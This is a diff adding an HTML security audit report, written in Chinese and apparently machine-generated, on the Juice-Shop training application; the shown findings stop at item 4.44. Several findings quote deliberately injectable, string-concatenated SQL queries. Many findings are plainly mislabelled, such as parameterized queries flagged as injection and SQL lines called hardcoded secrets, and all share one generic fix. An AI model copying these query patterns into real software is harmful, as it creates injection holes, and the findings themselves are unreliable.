@@ -1,0 +1,5009 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Juice-Shop 安全审计报告</title>
+<style>
+  body { font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif; margin: 40px auto; max-width: 980px; color: #222; line-height: 1.65; }
+  h1 { border-bottom: 3px solid #2c3e50; padding-bottom: 8px; }
+  h2 { color: #2c3e50; margin-top: 32px; }
+  h3 { margin-top: 22px; }
+  table { border-collapse: collapse; width: 100%; margin: 12px 0; }
+  th, td { border: 1px solid #ddd; padding: 8px 12px; text-align: left; vertical-align: top; }
+  th { background: #f4f6f8; }
+  code, pre { background: #f6f8fa; border-radius: 4px; }
+  pre { padding: 12px; overflow-x: auto; }
+  .meta { color: #888; font-size: 13px; }
+  .badge { display: inline-block; padding: 2px 10px; border-radius: 12px; color: #fff; font-size: 12px; }
+  .critical { background: #7b241c; } .high { background: #c0392b; }
+  .medium { background: #e67e22; } .low { background: #27ae60; }
+  .summary-box { background: #f8fbff; border: 1px solid #dbeafe; border-radius: 8px; padding: 16px 18px; margin: 14px 0; }
+  .summary-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
+  .summary-card { background: #fff; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px 14px; }
+  .summary-card h3 { margin: 0 0 8px; color: #1f2937; }
+  .workflow { padding-left: 22px; }
+  .workflow li { margin: 6px 0; }
+  .evidence { background: #f8fbff; border-left: 4px solid #3498db; padding: 10px 14px; margin: 12px 0; }
+  .priority { display: inline-block; min-width: 34px; font-weight: 700; color: #c0392b; }
+  @media (max-width: 760px) { .summary-grid { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+  <h1>Juice-Shop 安全审计报告</h1>
+  <p class="meta">生成工具：AuditAgentX　生成时间：2026-07-09 09:39:05 UTC</p>
+
+  <h2>1. 执行摘要</h2>
+  <div class="summary-box">
+    <p>本次审计对象为 Juice-Shop，来源为 https://github.com/juice-shop/juice-shop，项目主要语言为 TypeScript、Solidity、JavaScript、Python、Shell，框架识别结果为 Express，共解析 663 个文件、102598 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 404 条风险，其中 Critical 0 条、High 227 条、Medium 73 条、Low 104 条；静态分析覆盖 404 条，动态验证覆盖 0 条，其中 0 条已复现。主要风险类型集中在 Hardcoded Secret(188)、SSRF(70)、XSS(29)、Weak Randomness(22)，总体风险评级为 HIGH。</p>
+    <p>总体风险等级：<span class="badge high">HIGH</span></p>
+  </div>
+
+  <div class="summary-grid">
+    <div class="summary-card">
+      <h3>项目概况总结</h3>
+      <p>
+        项目 Juice-Shop 来源于 https://github.com/juice-shop/juice-shop，
+        主要语言为 TypeScript、Solidity、JavaScript、Python、Shell，
+        框架为 Express，
+        共 663 个文件、102598 行代码。
+      </p>
+    </div>
+    <div class="summary-card">
+      <h3>漏洞结果总结</h3>
+      <p>
+        本次共发现 404 条漏洞，其中 Critical 0 条、
+        High 227 条、Medium 73 条、Low 104 条。
+        静态与动态结果由 SummaryAgent 合并后生成以下结论。
+      </p>
+    </div>
+    <div class="summary-card">
+      <h3>静态分析总结</h3>
+      <p>静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 404 条静态风险。主要来源分布为 custom-taint(357)、semgrep(47)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。</p>
+    </div>
+    <div class="summary-card">
+      <h3>动态验证总结</h3>
+      <p>本次报告未发现已落库的动态运行证据。若需要展示漏洞利用效果，应启用 ExploitAgent 和动态验证配置，并在本地授权靶场执行。</p>
+    </div>
+  </div>
+
+  <h3>1.1 多智能体工作流</h3>
+  <ol class="workflow">
+    
+    <li>RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。</li>
+    
+    <li>StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。</li>
+    
+    <li>AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。</li>
+    
+    <li>VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。</li>
+    
+    <li>ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。</li>
+    
+    <li>SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。</li>
+    
+  </ol>
+
+  <h3>1.2 SummaryAgent 修改建议</h3>
+  <table>
+    <tr><th>优先级</th><th>建议</th><th>说明</th></tr>
+    
+    <tr>
+      <td><span class="priority">P0</span></td>
+      <td>优先修复 Critical/High 漏洞</td>
+      <td>先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。</td>
+    </tr>
+    
+    <tr>
+      <td><span class="priority">P1</span></td>
+      <td>按漏洞类型批量治理</td>
+      <td>对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。</td>
+    </tr>
+    
+    <tr>
+      <td><span class="priority">P1</span></td>
+      <td>补充动态验证覆盖</td>
+      <td>为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。</td>
+    </tr>
+    
+    <tr>
+      <td><span class="priority">P2</span></td>
+      <td>纳入持续审计流程</td>
+      <td>将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。</td>
+    </tr>
+    
+  </table>
+
+  <h2>2. 项目概况</h2>
+  <table>
+    <tr><th>项目名称</th><td>Juice-Shop</td></tr>
+    <tr><th>来源</th><td>https://github.com/juice-shop/juice-shop</td></tr>
+    <tr><th>语言</th><td>TypeScript, Solidity, JavaScript, Python, Shell</td></tr>
+    <tr><th>框架</th><td>Express</td></tr>
+    <tr><th>文件数 / 代码行数</th><td>663 / 102598</td></tr>
+    <tr><th>扫描任务</th><td>scan_b669bb58（full / done）</td></tr>
+  </table>
+
+  <h2>3. 漏洞统计</h2>
+  <table>
+    <tr><th>Critical</th><th>High</th><th>Medium</th><th>Low</th><th>合计</th></tr>
+    <tr>
+      <td>0</td><td>227</td>
+      <td>73</td><td>104</td>
+      <td><b>404</b></td>
+    </tr>
+  </table>
+
+  <h2>4. 漏洞明细</h2>
+  
+  <h3>4.1 run-shell-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www-legacy.yml:36　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.2 run-shell-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:27　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.3 run-shell-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:36　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.4 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_1.ts:5　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.5 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_3.ts:11　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.6 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\unionSqlInjectionChallenge_1.ts:6　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.7 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\unionSqlInjectionChallenge_3.ts:10　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.8 detected-generic-secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\users.yml:151　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.9 detected-jwt-token <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\app.guard.spec.ts:46　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.10 detected-jwt-token <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\last-login-ip\last-login-ip.component.spec.ts:72　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.11 detected-jwt-token <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\frontend\src\app\last-login-ip\last-login-ip.component.spec.ts:78　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.12 remote-property-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\currentUser.ts:31　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.13 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\login.ts:34　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.14 express-sequelize-injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\search.ts:23　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.15 code-string-concat <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\routes\userProfile.ts:61　
+    来源 semgrep　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>requires login</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.16 Insecure Deserialization <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    server.ts:139　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const swaggerDocument = yaml.load(fs.readFileSync(&#39;./swagger.yml&#39;, &#39;utf8&#39;))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.17 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/dbSchemaChallenge_1.ts:5　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(&#34;SELECT * FROM Products WHERE ((name LIKE &#39;%&#34;+criteria+&#34;%&#39; OR description LIKE &#39;%&#34;+criteria+&#34;%&#39;) AND deletedAt IS NULL) ORDER BY name&#34;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.18 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/dbSchemaChallenge_3.ts:11　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#39;%${criteria}%&#39; OR description LIKE &#39;%${criteria}%&#39;) AND deletedAt IS NULL) ORDER BY name`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.19 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_1.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.20 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_1.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.21 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_2.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.22 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_2.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.23 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_3.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.24 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginAdminChallenge_4_correct.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.25 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_1.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.26 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_1.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.27 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_2_correct.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $mail AND password = $pass AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.28 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_3.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.29 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_3.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.30 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_4.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: fals</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.31 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginBenderChallenge_4.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: fals</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.32 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_1_correct.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.33 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_2.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: fals</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.34 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_2.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: fals</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.35 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_3.ts:15　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = ? AND password = ? AND deletedAt IS NULL`,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.36 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_4.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.37 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/loginJimChallenge_4.ts:18　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Users WHERE email = &#39;${req.body.email || &#39;&#39;}&#39; AND password = &#39;${security.hash(req.body.password || &#39;&#39;)}&#39; AND deletedAt IS NULL`, { model: models.User, plain: true</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.38 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/unionSqlInjectionChallenge_1.ts:6　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#39;%${criteria}%&#39; OR description LIKE &#39;%${criteria}%&#39;) AND deletedAt IS NULL) ORDER BY name`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.39 SQL Injection <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    data/static/codefixes/unionSqlInjectionChallenge_3.ts:10　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE &#39;%${criteria}%&#39; OR description LIKE &#39;%${criteria}%&#39;) AND deletedAt IS NULL) ORDER BY name`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.40 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/payment/payment.component.spec.ts:351　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>userService.upgradeToDeluxe.mockReturnValue(of({ token: &#39;tokenValue&#39; }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.41 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/register/register.component.spec.ts:155　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const user = { email: &#39;x@x.xx&#39;, password: &#39;password&#39;, passwordRepeat: &#39;password&#39;, securityQuestion: { id: 1, question: &#39;Wat is?&#39; }, securityAnswer: &#39;Answer&#39; }</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.42 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/keys.service.spec.ts:68　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>expect(req.request.body).toEqual({ privateKey: &#39;privateKey&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.43 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/two-factor-auth-service.spec.ts:36　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>expect(req.request.body).toEqual({ tmpToken: &#39;000000&#39;, totpToken: &#39;123456&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.44 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
